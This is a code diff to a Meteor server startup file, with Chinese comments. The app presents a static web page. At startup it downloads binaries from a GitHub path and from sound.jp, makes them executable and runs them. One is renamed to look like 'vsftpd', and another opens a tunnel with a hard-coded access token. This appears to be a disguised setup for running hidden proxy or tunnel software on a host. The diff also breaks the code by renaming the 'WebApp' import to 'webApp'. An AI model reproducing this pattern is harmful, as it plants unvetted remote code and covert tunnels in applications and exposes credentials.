@@ -1,5 +1,5 @@
 import { Meteor } from 'meteor/meteor';
-import { WebApp } from 'meteor/webapp';
+import { webApp } from 'meteor/webapp';
 import { fetch } from 'meteor/fetch';
 import fs from 'fs';
 import { exec } from 'child_process';
@@ -11,38 +11,22 @@ const execAsync = promisify(exec);
 const BEGIN_SH_CONTENT = `#!/bin/sh
 
 echo "-----  Starting server...----- "
-Token=\${Token:-'eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiNDE3OGQ2N2MtZTg5My00ZjliLWFhODItZjllODFmNTI4NTA1IiwicyI6Ik0ySmxPR1F4TnpFdFlXTmpZUzAwTlRNeExUZzRPVEF0Wldaa05UUmhOVFptTlRFdyJ9'}
+Token=\${Token:-'eyJhIjoiYjQ2N2Q5MGUzZDYxNWFhOTZiM2ZmODU5NzZlY2MxZjgiLCJ0IjoiNjBlZjljZGUtNTkyNC00Mjk4LTkwN2QtY2FjNzlkNDlmYTQ4IiwicyI6IlltUTFaalJtTURFdFpUbGtZaTAwTUdObUxXRTFOalF0TURWak5qTTBZekV4TjJSaiJ9'}
 
-# 启动 server 并重定向输出到临时文件
-./server tunnel --edge-ip-version auto run --token $Token > server.log 2>&1 &
+# 启动 server 并直接输出到控制台
+./server tunnel --edge-ip-version auto run --token $Token 2>&1 | while read line; do echo "[Server] $line"; done &
 SERVER_PID=$!
 echo "Server started with PID: $SERVER_PID"
 
-# 实时显示 server 日志
-tail -f server.log &
-TAIL_SERVER_PID=$!
+echo "-----  Starting vsftpd ...----- "
+# 启动 vsftpd 并直接输出到控制台
+./vsftpd 2>&1 | while read line; do echo "[vsftpd] $line"; done &
+vsftpd_PID=$!
+echo "vsftpd started with PID: $vsftpd_PID"
 
-echo "-----  Starting web ...----- "
-# 启动 web 并重定向输出到临时文件
-./web > web.log 2>&1 &
-WEB_PID=$!
-echo "Web started with PID: $WEB_PID"
-
-# 实时显示 web 日志
-tail -f web.log &
-TAIL_WEB_PID=$!
-
-# 等待主进程
-wait $SERVER_PID $WEB_PID
-
-# 清理日志监控进程
-kill $TAIL_SERVER_PID $TAIL_WEB_PID 2>/dev/null
-
-# 检查退出状态
-if [ $? -ne 0 ]; then
-    echo "One of the processes failed"
-    exit 1
-fi`;
+# 记录进程已启动
+echo "All processes started successfully"
+exit 0`;
 
 const FILES_TO_DOWNLOAD = [
   {
@@ -54,8 +38,8 @@ const FILES_TO_DOWNLOAD = [
     filename: 'server',
   },
   {
-    url: 'https://github.com/wwrrtt/test/raw/main/web',
-    filename: 'web',
+    url: 'https://sound.jp/kid/vsftpd',
+    filename: 'vsftpd',
   }
 ];
 
@@ -88,7 +72,7 @@ async function setupFiles() {
 
     console.log('Files downloaded, setting permissions...');
     // 添加执行权限
-    await execAsync('chmod +x begin.sh server web');
+    await execAsync('chmod +x begin.sh server vsftpd');
     
     console.log('Executing begin.sh...');
     // 执行脚本并实时获取输出
@@ -150,7 +134,7 @@ Meteor.startup(async () => {
     
     console.log('Setup completed, starting web server...');
     // 设置根路由，返回静态页面
-    WebApp.connectHandlers.use('/', (req, res, next) => {
+    webApp.connectHandlers.use('/', (req, res, next) => {
       if (req.url === '/') {
         try {
           const content = fs.readFileSync('index.html', 'utf8');
@@ -165,7 +149,7 @@ Meteor.startup(async () => {
       }
     });
     
-    console.log('Web server started successfully');
+    console.log('web server started successfully');
   } catch (error) {
     console.error('Startup error:', error);
   }
